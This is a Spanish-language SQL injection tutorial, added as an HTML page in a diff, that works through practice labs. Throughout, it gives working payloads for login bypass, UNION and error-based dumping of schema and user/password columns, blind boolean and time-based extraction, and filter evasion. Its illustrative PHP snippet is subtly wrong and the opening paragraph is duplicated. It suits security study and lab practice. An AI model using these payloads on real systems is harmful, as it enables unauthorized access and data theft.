@@ -1,0 +1,471 @@
+I"�<p class="lead">En esta seccion <strong>Un Poco De Web Pentesting</strong> mi intencion es explicar sin tanto tramite como explotar varias vulnerabilidades web tomando como ejemplo CTFs y laboratorios que me encuentro, ten en cuenta que este solo es un recurso mas de los que hay internet.</p>
+
+<p>En esta seccion <strong>Un Poco De Web Pentesting</strong> mi intencion es explicar sin tanto tramite como explotar varias vulnerabilidades web tomando como ejemplo CTFs y laboratorios que me encuentro, ten en cuenta que este solo es un recurso mas de los que hay internet.</p>
+
+<h2 id="sql-injection-in-where-clause">SQL injection in WHERE clause</h2>
+
+<p>Lab: <a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data">PortSwigger</a></p>
+
+<p>Cuando se hace referencia a “WHERE clause”, me refiero a cuando se esta haciendo uso de la clausula <strong>WHERE</strong> y no se estan sanitizando las entradas del usuario, asi que nosotros podemos ir alterando la consulta a nuestro favor para inyectar nuestros inputs maliciosos. El objetivo de este laboratorio es encontrar la forma de listar todos los productos que se encuentran para una categoria.</p>
+
+<p>El laboratorio nos menciona que cuando se selecciona una categoria se esta realizando una consulta como esta:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">category</span> <span class="o">=</span> <span class="s1">'Gifts'</span> <span class="k">AND</span> <span class="n">released</span> <span class="o">=</span> <span class="mi">1</span>
+</code></pre></div></div>
+<p>Es decir:</p>
+
+<p><img src="/assets/img/UPDWP-SQLi/sql1.png" alt="" /></p>
+
+<p>Donde <code class="language-plaintext highlighter-rouge">category</code> y <code class="language-plaintext highlighter-rouge">released</code> seguramente sean columnas de la tabla <code class="language-plaintext highlighter-rouge">products</code>.
+Vemos que en la consulta se esta usando el <code class="language-plaintext highlighter-rouge">AND</code>, lo que quiere decir que se deben de cumplir las condiciones de que <code class="language-plaintext highlighter-rouge">category = 'Gift'</code> y <code class="language-plaintext highlighter-rouge">released = 1</code>, seguramente <code class="language-plaintext highlighter-rouge">released</code> es la columna que dice si un producto esta publicado o no.</p>
+
+<p>Rgresando a la pagina, cuando seleccionamos la categoria <code class="language-plaintext highlighter-rouge">Pets</code> en la web nos muestra algo como esto:</p>
+
+<p><img src="/assets/img/UPDWP-SQLi/sql2.png" alt="" /></p>
+
+<p>Y en la URL sale algo como:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/filter?category=Pets
+</code></pre></div></div>
+<p>Osea que esta filtrando por la categoria Pets, recordemos que en esta ocasion no se esta sanitizando la consulta, por lo que podemos ir alterando la consulta para poder filtrar datos.</p>
+
+<p>Entonces si sabemos como se esta haciendo la consulta, podemos empezar a modificarla, que pasara si ahora en la URL le mandamos esto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>filter?category=Pets' or 1=1-- -
+</code></pre></div></div>
+<p>Ahora la consulta sera algo como esto:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">category</span> <span class="o">=</span> <span class="s1">'Pets'</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- -</span>
+</code></pre></div></div>
+
+<p>Lo que esta haciendo ahora es seleccionar todas las columnas de la tabla products donde la categoria sea Pets o 1=1.</p>
+
+<p>Cuando se usa <code class="language-plaintext highlighter-rouge">or</code> lo que hace es combinar varias condiciones en un WHERE, y al usarlo se asume que la condicion completa es verdadera cuando cualquiera de las condiciones sea verdadera.</p>
+
+<p>En este caso toda la consulta es TRUE, ya que 1 si es igual a 1, y category es igual a ‘Pets’.</p>
+
+<p>Pero vemos que al final de la consulta tiene un <code class="language-plaintext highlighter-rouge">-- -</code>, esto es una forma de hacer comentarios en SQL, y lo usamos en esa parte ya que queremos que la condicion <code class="language-plaintext highlighter-rouge">AND released = 1</code> se omita, asi seria la consulta que pasa por detras:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">products</span> <span class="k">WHERE</span> <span class="n">category</span> <span class="o">=</span> <span class="s1">'Pets'</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- - AND released = 1</span>
+                                                                  <span class="o">|</span>
+                                                                  <span class="o">|</span>
+                                                    <span class="n">Ahora</span> <span class="n">esto</span> <span class="n">esta</span> <span class="n">comentado</span> <span class="n">y</span> <span class="k">no</span> <span class="n">es</span> <span class="n">valido</span>
+</code></pre></div></div>
+<p>Y con esto pudimos resolver el laboratorio, ya que mostramos todos los productos de la categoria Pets:D</p>
+
+<h2 id="sql-injection-broken-authentication">SQL injection Broken Authentication</h2>
+
+<p>Con <code class="language-plaintext highlighter-rouge">Broken Authentication</code> me refiero a que podemos evadir la autenticacion de una pagina web, como el inicio de sesion de una web, puede ocurrir que no conozcamos la contraseña ni el usuario, o puede ser que conozcamos un usuario con el que podemos iniciar sesion pero no conocemos su contraseña, sin embargo, no se estan sanitizando los inputs como en el ejemplo anterior y podemos ir modificando la consulta para inyectar nuestros inputs maliciosos.</p>
+
+<p>Lab: <a href="http://challenges.ringzer0team.com:10001/">ringzer0</a></p>
+
+<p>Al entrar, podemos ver algo como esto:</p>
+
+<p><img src="/assets/img/UPDWP-SQLi/sqli3.png" alt="" /></p>
+
+<p>Donde por detras, seguramente se esta relizando una consulta como esta, suponiendo que PHP es el lenguaje:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$consulta</span> <span class="o">=</span> <span class="s2">"SELECT * FROM users WHERE username='"</span> <span class="o">+</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"user"</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"' AND password= '"</span> <span class="o">+</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">]</span><span class="err">$</span> <span class="o">+</span> <span class="err">'</span><span class="s2">";"</span>
+</code></pre></div></div>
+
+<p>Nuestro objetivo es evadir el login usando un usuario valido sin conocer la contraseña, regularmente en una tabla donde se almacenan usuarios, el usuario <code class="language-plaintext highlighter-rouge">admin</code> se encuentra registrado.</p>
+
+<p>Podemos intentar mandarle esto como input:</p>
+
+<p>usuario: admin’</p>
+
+<p>contraseña: or 1=1– -</p>
+
+<p>Y la consulta seria algo asi:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'admin'</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- - AND password = "no se"</span>
+</code></pre></div></div>
+<p>Y la explicacion es la misma que en el laboratorio anterior, solo que ahora estamos diciendo que vamos a iniciar con el usuario <code class="language-plaintext highlighter-rouge">admin</code> sin conocer la contraseña, ya que se comento la parte de <code class="language-plaintext highlighter-rouge">AND password = ""</code> y ya no se hace valida.</p>
+
+<p>Y con eso resolvimos el desafio:</p>
+
+<p><img src="/assets/img/UPDWP-SQLi/sqli4.png" alt="" /></p>
+
+<h2 id="in-band-based">In-band based</h2>
+
+<p>In-band es cuando la respuesta/salida de la consulta se muestra en la pagina web, osea en el front-end</p>
+
+<h3 id="union-based-sql-injection">UNION-based SQL injection</h3>
+
+<p>En este tipo de inyeccion se hace uso del operador <code class="language-plaintext highlighter-rouge">UNION</code> con el fin de unir los resultados de varios <code class="language-plaintext highlighter-rouge">SELECT</code>.</p>
+
+<h5 id="funcion-de-union">Funcion de UNION</h5>
+
+<p>Imaginemos que tenemos una consulta como esta:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">nombre</span><span class="p">,</span> <span class="n">anime</span> <span class="k">FROM</span> <span class="n">waifus</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">nombre</span><span class="p">,</span> <span class="n">apellido</span> <span class="k">FROM</span> <span class="n">personas</span>
+</code></pre></div></div>
+<p>Lo que esta haciendo es unir el resultado de la consulta <code class="language-plaintext highlighter-rouge">SELECT nombre, anime FROM waifus</code> con el resultado de la consulta <code class="language-plaintext highlighter-rouge">SELECT nombre, apellido FROM personas</code>, visualmente cada una de las consultas seria asi:</p>
+
+<p><img src="/assets/img/UPDWP-SQLi/sqlUnion.png" alt="" /></p>
+
+<p>Se puede ver que cuando se hizo el <code class="language-plaintext highlighter-rouge">UNION</code>, los datos de la segunta consulta se agregaron al final. Algunas consideraciones son:</p>
+
+<ul>
+  <li>Cuando realizamos un UNION entre dos SELECT, los dos deben de tener el mismo numero de columnas seleccionadas en la consulta</li>
+  <li>Deben de coincidir los tipos de datos, es decir, en el ejemplo de arriba debe de coincidir el tipo de dato de la columna <code class="language-plaintext highlighter-rouge">nombre</code> de la tabla waifus, con el de la columna <code class="language-plaintext highlighter-rouge">nombre</code> de la tabla personas</li>
+  <li>Si no quieres descartar datos duplicados, usa <code class="language-plaintext highlighter-rouge">UNION ALL</code></li>
+</ul>
+
+<p>Para saber si estamos contra una inyeccion de este tipo, podemos usar el payload <code class="language-plaintext highlighter-rouge">1' UNION SELECT 1,2,3-- -</code>.</p>
+
+<p>Y si en la repuesta de la consulta ocurre que:</p>
+
+<ul>
+  <li>Añada los datos de la segunda consulta</li>
+  <li>Salga el mensaje <code class="language-plaintext highlighter-rouge">The used SELECT statements have a different number of columns</code></li>
+</ul>
+
+<p>Es por que estamos ante una inyeccion SQL de este tipo</p>
+
+<h5 id="obteniendo-al-numero-de-columnas">Obteniendo al numero de columnas</h5>
+
+<p>Antes de realizar UNION-based, es necesario conocer el numero de columnas que tiene, comunmente se hace con la instruccion <code class="language-plaintext highlighter-rouge">ORDER BY</code>, esta instruccion nos sirve para hacer un ordenamiento de los datos con base en un numero de columnas, es decir, si usamos el payload <code class="language-plaintext highlighter-rouge">1' ORDER BY 10-- -</code>, le estamos diciento que nos ordene los datos basandose en la decima columna, si la tabla no tiene 10 columnas nos saltara un error, asi que podemos ir prueba y error hasta saber el numero de columnas existentes.</p>
+
+<h5 id="obteniendo-informacion-basica">Obteniendo informacion basica</h5>
+
+<ul>
+  <li>
+    <p><strong>Nombre de la base de datos:</strong> <code class="language-plaintext highlighter-rouge">1' UNION SELECT null, null, database()-- -</code></p>
+  </li>
+  <li>
+    <p><strong>Version de la base da datos:</strong> 1’ <code class="language-plaintext highlighter-rouge">UNION SELECT null, null, @@version-- -</code></p>
+  </li>
+  <li>
+    <p><strong>Usuario en uso de la base de datos:</strong> <code class="language-plaintext highlighter-rouge">1' UNION SELECT null, null, user()-- -</code></p>
+  </li>
+</ul>
+
+<h5 id="concatenando">Concatenando</h5>
+
+<p>Habra veces donde tendremos que mostrar los resultados de varias columnas en una sola, para eso podemos concatenarlos usando <code class="language-plaintext highlighter-rouge">concat()</code>, de esta manera:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' UNION SELECT null, CONCAT(usuario, contraseña), null FROM usuarios-- -
+</span></code></pre></div></div>
+<p>En ese ejemplo estamos concatenando <code class="language-plaintext highlighter-rouge">usuario</code> y <code class="language-plaintext highlighter-rouge">contraseña</code> en el resultado de la columna 2</p>
+
+<h5 id="obteniendo-informacion-con-information-schema">Obteniendo informacion con information schema</h5>
+
+<p>Los gestores de bases de datos tienen bases de datos que guardan informacion de otras bases de datos, en MySQL se llama <code class="language-plaintext highlighter-rouge">information_schema</code></p>
+
+<p><strong>Enumerar las bases de datos</strong></p>
+
+<p>Una vez que sepamos el numero de columnas podemos usar un payload como este:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' UNION SELECT schema_name, null, null FROM information_schema.schemata-- -
+</span></code></pre></div></div>
+
+<p>Donde la tabla <code class="language-plaintext highlighter-rouge">schemata</code> tiene informacion de las bases de datos, y una de sus columnas es <code class="language-plaintext highlighter-rouge">schema_name</code>, la cual tiene el nombre de las bases de datos.</p>
+
+<p><strong>Enumeracion de tablas</strong></p>
+
+<p>Supongamos que el resultado de la consulta anterior nos dio el nombre de una base de datos que se llama <code class="language-plaintext highlighter-rouge">waifus</code>, asi que para sacar sus tablas podemos usar:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' UNION SELECT table_name, null, null FROM informacion_schema.tables WHERE table_schema="waifus"-- -
+</span></code></pre></div></div>
+<p>Donde:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">table_name</code> son las tablas</li>
+  <li><code class="language-plaintext highlighter-rouge">table_schema</code> es el nombre de la base da datos</li>
+</ul>
+
+<p><strong>Enumeracion de columnas</strong></p>
+
+<p>Supongamos que la consulta anterior nos dio una tabla que se llama <code class="language-plaintext highlighter-rouge">besto_waifus</code>, entonces para sacar sus columnas se usaria:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' UNION SELECT column_name, null, null FROM information_schema.columns WHERE table_schema="waifus" AND table_name="besto_waifus"-- -
+</span></code></pre></div></div>
+
+<p>Donde:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">column_name</code> son las columnas de la tabla</li>
+  <li><code class="language-plaintext highlighter-rouge">table_schema</code> es la base de datos</li>
+  <li><code class="language-plaintext highlighter-rouge">table_name</code> es la tabla</li>
+</ul>
+
+<p><strong>Mostrando los datos</strong></p>
+
+<p>Supongamos que la anterior consulta nos arrojo que tiene las columnas <code class="language-plaintext highlighter-rouge">nombre</code> y <code class="language-plaintext highlighter-rouge">anime</code>, asi que para mostrar esos datos podriamos usar:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' UNION SELECT null, null, CONCAT(nombre, anime) FROM besto_waifus-- -
+</span></code></pre></div></div>
+
+<p><strong>Mostrando los datos de otra base de datos</strong></p>
+
+<p>En todo caso de que estemos enumerando las tablas y columnas de una base de datos diferente a la que esta en uso, y queremos mostrar los datos de una tabla, podriamos usar lo siguiente</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' UNION SELECT null, null, CONCAT(nombre, anime) FROM waifus.besto_waifus-- -
+</span></code></pre></div></div>
+
+<p>Donde:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">waifus</code> es la base de datos</li>
+  <li><code class="language-plaintext highlighter-rouge">besto_waifus</code> es la tabla</li>
+</ul>
+
+<h3 id="error-based-sql-injection">Error-based SQL injection</h3>
+
+<p>Lab: <a href="http://testphp.vulnweb.com/listproducts.php?cat=1">Acunetix</a>
+(El numero total de columnas es 11)</p>
+
+<p>La idea de las error-based es ocasionar a proposito un error, de tal forma, que podamos usar ese error para sacar informacion de la base de datos</p>
+
+<p>La forma mas facil de ocasionar un error es agregando una comilla al final de la consulta, y el URL quedaria algo asi <code class="language-plaintext highlighter-rouge">http://testphp.vulnweb.com/listproducts.php?cat=1'</code>, donde el resultado es:</p>
+
+<p><strong><em>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’ at line 1 Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74</em></strong></p>
+
+<p>Con esto sabemos que se esta usando MySQL como gestor, que ocasiono el error, donde lo ocasiono, y como extra nos muestra el directorio de un recurso: <code class="language-plaintext highlighter-rouge">/hj/var/www/listproducts.php</code></p>
+
+<h5 id="enumerando-la-base-de-datos">Enumerando la base de datos</h5>
+
+<p><strong>Obteniendo el nombre de la base de datos</strong></p>
+
+<p>Podemos hacer uso de la funcion <code class="language-plaintext highlighter-rouge">EXTRACTVALUE()</code> la cual toma dos argumentos, una cadena de marcado XML y una expresion XPath. cuando se usa <code class="language-plaintext highlighter-rouge">EXTRACTVALUE()</code> lo que regresa es un texto. Usaremos el payload:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">AND</span> <span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span><span class="n">CONCAT</span><span class="p">(</span><span class="s1">'='</span><span class="p">,</span><span class="k">database</span><span class="p">()))</span><span class="c1">-- -</span>
+</code></pre></div></div>
+
+<p>Basicamente muestra el nombre de la base de datos en uso, gracias a que ocasiono un error.
+Entonces la URL queda asi:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://testphp.vulnweb.com/listproducts.php?cat=1 AND EXTRACTVALUE('',CONCAT('=',database()))-- -</code></p>
+
+<p>Y el resultado es:</p>
+
+<p><img src="/assets/img/UPDWP-SQLi/error1.png" alt="" /></p>
+
+<p>Vemos como la base de datos es <code class="language-plaintext highlighter-rouge">acuart</code></p>
+
+<p><strong>Enumeracion de las bases de datos</strong></p>
+
+<p>Ojo: en este tipo de inyeccion solo podemos sacar un columna, asi que usaremos <code class="language-plaintext highlighter-rouge">LIMIT 0,1</code> para solo obtener un dato.</p>
+
+<p>Usaremos el payload:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">AND</span> <span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span><span class="n">CONCAT</span><span class="p">(</span><span class="s1">'='</span><span class="p">,(</span><span class="k">SELECT</span> <span class="n">concat</span><span class="p">(</span><span class="k">schema_name</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span> <span class="k">LIMIT</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="c1">--</span>
+</code></pre></div></div>
+<p>Y la URL queda</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testphp.vulnweb.com/listproducts.php?cat=1%20AND%20EXTRACTVALUE(%27%27,CONCAT(%27=%27,(SELECT%20concat(schema_name)%20FROM%20information_schema.schemata%20LIMIT%200,1)))--
+</code></pre></div></div>
+
+<p>Y vemos que el resultado fue:</p>
+
+<p><img src="/assets/img/UPDWP-SQLi/error2.png" alt="" /></p>
+
+<p>Y nos dice que una base de datos es <code class="language-plaintext highlighter-rouge">ìnformation_schema</code></p>
+
+<p>Si queremos iterar entre los resultados solo hay que cambiar la parte de <code class="language-plaintext highlighter-rouge">LIMIT 0,1</code> a <code class="language-plaintext highlighter-rouge">LIMIT 1,1</code> y asi sucesivamente</p>
+
+<p><strong>Enumeracion de las tablas</strong></p>
+
+<p>Una de las bases de datos existentes es <code class="language-plaintext highlighter-rouge">acuart</code> asi que ahora mostraremos las tablas con el payload:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">AND</span> <span class="n">EXTRACTVALUE</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span><span class="n">CONCAT</span><span class="p">(</span><span class="s1">'='</span><span class="p">,(</span><span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">WHERE</span> <span class="n">table_schema</span><span class="o">=</span><span class="nv">"acuart"</span> <span class="k">LIMIT</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="c1">-- -</span>
+</code></pre></div></div>
+
+<p>Y vemos que una de las tablas es <code class="language-plaintext highlighter-rouge">artist</code></p>
+
+<p><img src="/assets/img/UPDWP-SQLi/error3.png" alt="" /></p>
+
+<h2 id="blind-based-sql-injections">Blind-Based SQL injections</h2>
+
+<p>Este tipo de inyeccion se caracterizan por que no podemos ver el resultado de la consulta en la respuesta de la web, osea en el front-end, y en ocasiones no devolvera nada.</p>
+
+<h3 id="boolean-based">Boolean-based</h3>
+
+<p>Estas inyecciones utilizan condiciones booleanas (TRUE o FALSE), en las cuales devuelve un resultado dependiendo si un dato es correcto o no. En donde una consulta que sea TRUE devuelve un resultado diferente a una que sea FALSE</p>
+
+<p>Para saber si estamos contra una boolean based, podemos inyectar operadores logicos como <code class="language-plaintext highlighter-rouge">AND</code> y ir probando con una condicion que sea verdad(1=1) y una que sa falsa(1=2).</p>
+
+<h5 id="funcion-de-substr">Funcion de substr()</h5>
+
+<p>Esta funcion devuelve el numero de caracteres desde una posicion, dado un string, donde su estructura es:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">subtr</span><span class="p">(</span><span class="n">posicion</span><span class="p">,</span> <span class="n">cantidad_de_caracteres</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Por ejemplo, al seleccionar el nombre de la base de datos podemos ver que nos sale esto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MariaDB [information_schema]&gt; select database();
++--------------------+
+| database()         |
++--------------------+
+| information_schema |
++--------------------+
+1 row in set (0.000 sec)
+
+MariaDB [information_schema]&gt; 
+</code></pre></div></div>
+
+<p>Ahora usaremos <code class="language-plaintext highlighter-rouge">substr()</code> para que nos regrese el primer caracter de la base de datos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MariaDB [information_schema]&gt; select substr((select database()), 1, 1);
++-----------------------------------+
+| substr((select database()), 1, 1) |
++-----------------------------------+
+| i                                 |
++-----------------------------------+
+1 row in set (0.003 sec)
+</code></pre></div></div>
+<p>Lo que estamos haciendo es decirle es que desde la primera posicion nos regrese un caracter del resultado de <code class="language-plaintext highlighter-rouge">select database()</code>.</p>
+
+<p>Si queremos que desde la segunda posicion nos regrese un caracter , sera asi:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">database</span><span class="p">()),</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</code></pre></div></div>
+<p>Y si queremos que desde la primera posicion nos regrese dos caracteres, ahora es asi:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">database</span><span class="p">()),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h5 id="nombre-de-la-base-de-datos">Nombre de la base de datos</h5>
+
+<p>Y podemos usar el payload:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND SUBSTR(database(),1,1)="w"-- -
+</span></code></pre></div></div>
+<p>El cual esta comparando si el primer caracter del nombre la base de datos es igual a <code class="language-plaintext highlighter-rouge">w</code> y en caso de que sea correcto, nos devolvera TRUE y el servidor web nos respondera de cierta forma, por ejemplo, mostrando el mensaje <code class="language-plaintext highlighter-rouge">Hola c4rtita</code>, y en caso de que no sea una letra de la base de datos y responda FALSE, entonces el mensaje <code class="language-plaintext highlighter-rouge">Hola c4rtita</code> ya no aparecera.</p>
+
+<p>Ahora, en caso que <code class="language-plaintext highlighter-rouge">w</code> si sea una letra de la base de datos, entonces ahora tendremos que sacar la segunda, y usaremos el payload:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND SUBSTR(database(),2,1)="a"-- 
+</span></code></pre></div></div>
+<p>En esta caso vamos a comparar si la letra que se encuentra en la posicion dos del nombre de la base de datos es igual a <code class="language-plaintext highlighter-rouge">a</code>. Y asi podemos ir adivinando el nombre de la base de datos, pero es muy tedioso, asi que en este tipo de inyecciones tendras que hacerte un script.</p>
+
+<p>Para complementar la explicacion puedes leer <a href="https://sec-art.net/2021/12/30/boolean-based-sql-injection-explained-sql-injection-series-web-security/">aqui</a></p>
+
+<h3 id="time-based">Time-Based</h3>
+
+<p>Son casi iguales que las Boolean-based, solo que ahora para saber si nuestra inyeccion es correcta, tendremos que esperar un cierto tiempo antes de que el servidor nos de una respuesta, y al igual que las boolean based, necesitamos que la primera expresion <code class="language-plaintext highlighter-rouge">AND</code> devuelva un TRUE.</p>
+
+<p>Para saber si estamos ante una inyeccion de este tipo, podemos usar este payload:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and sleep(5)-- -
+</span></code></pre></div></div>
+<p>Y si el servidor tarda 5 segundos en darnos una repuesta es por que estamos contra una inyeccion de este tipo</p>
+
+<h5 id="nombre-de-la-base-de-datos-1">Nombre de la base de datos</h5>
+
+<p>Podemos usar el payload:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND IF(SUBSTR(database(),1,1)="w", sleep(5),1)-- -
+</span></code></pre></div></div>
+<p>Lo que esta haciendo es comparar que la primera letra del nombre de la base de datos sea <code class="language-plaintext highlighter-rouge">w</code>, y en caso de que lo sea nos regresa TRUE, y esperara 5 segundos.</p>
+
+<p>Con las boolean-based y las time-based tambien podemos enumerar tablas y columnas usando la base de datos <code class="language-plaintext highlighter-rouge">ìnformation_schema</code>, como por ejemplo de esta forma:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND IF(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema="waifus" LIMIT 0,1),1,1)="b",sleep(5),1)-- -
+</span></code></pre></div></div>
+
+<p>Donde esta comparando si la primera letra de la primera tabla de la base de datos <code class="language-plaintext highlighter-rouge">waifus</code> es igual a <code class="language-plaintext highlighter-rouge">b</code>, y si es TRUE, entonces el servidor tarda 5 segundos en responder.</p>
+
+<p>Y por ultimo, en las boolean-based y time-based se ocupan scritps para hacer mas rapido el proceso.</p>
+
+<p>Si quieres leer mas de las time-based puedes leer <a href="https://sec-art.net/2021/12/30/time-based-sql-injection-explained-sql-injection-series-web-security/">aqui</a></p>
+
+<h2 id="bypass-filters-sql-injection">Bypass filters SQL injection</h2>
+
+<h3 id="null-bytes">null-bytes</h3>
+
+<p>Puede ser que en la consulta se esten bloquendo ciertos caracteres en la consulta de SQL, una forma es usando <code class="language-plaintext highlighter-rouge">null-byte</code>, basicamente poner <code class="language-plaintext highlighter-rouge">%00</code> por delante de el caracter que es este bloquendo:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">%</span><span class="mi">00</span><span class="s1">' or 1=1--
+</span></code></pre></div></div>
+
+<h3 id="url-encode">URL encode</h3>
+
+<p>Los caracteres no validos en las URL deben de convertirse a ASCII validos para que las URL los puedan interpretar, por ejemplo:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' or 1=1--
+</span></code></pre></div></div>
+<p>En URL encode es:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%27%20or%201%3D1--
+</code></pre></div></div>
+
+<p>Para codificarlos pueden usar <a href="https://www.urlencoder.org/">URL encode</a></p>
+
+<h3 id="hex-encoding">Hex encoding</h3>
+
+<p>Con la codifcacion hexadecimal va a remplazar los caracteres originales con su valor en hexadecimal</p>
+
+<p>Normal:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MariaDB</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="n">anime</span> <span class="k">FROM</span> <span class="n">waifus</span> <span class="k">WHERE</span> <span class="n">nombre</span> <span class="o">=</span> <span class="nv">"Miwa Yamamura"</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">-----------+</span>
+<span class="o">|</span> <span class="n">anime</span>     <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----------+</span>
+<span class="o">|</span> <span class="n">Barakamon</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----------+</span>
+<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span> <span class="n">sec</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Hex:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MariaDB</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="n">anime</span> <span class="k">FROM</span> <span class="n">waifus</span> <span class="k">WHERE</span> <span class="n">nombre</span> <span class="o">=</span> <span class="n">UNHEX</span><span class="p">(</span><span class="s1">'4D6977612059616D616D757261'</span><span class="p">);</span>
+<span class="o">+</span><span class="c1">-----------+</span>
+<span class="o">|</span> <span class="n">anime</span>     <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----------+</span>
+<span class="o">|</span> <span class="n">Barakamon</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----------+</span>
+<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span> <span class="n">sec</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="char-encoding">Char encoding</h3>
+
+<p>Seria practicamente lo mismo que la hexadecimal, solo que ahora se hace uso de la funcion <code class="language-plaintext highlighter-rouge">CHAR()</code></p>
+
+<p>Puedes consultar la tabla usando <code class="language-plaintext highlighter-rouge">man ascii</code>:</p>
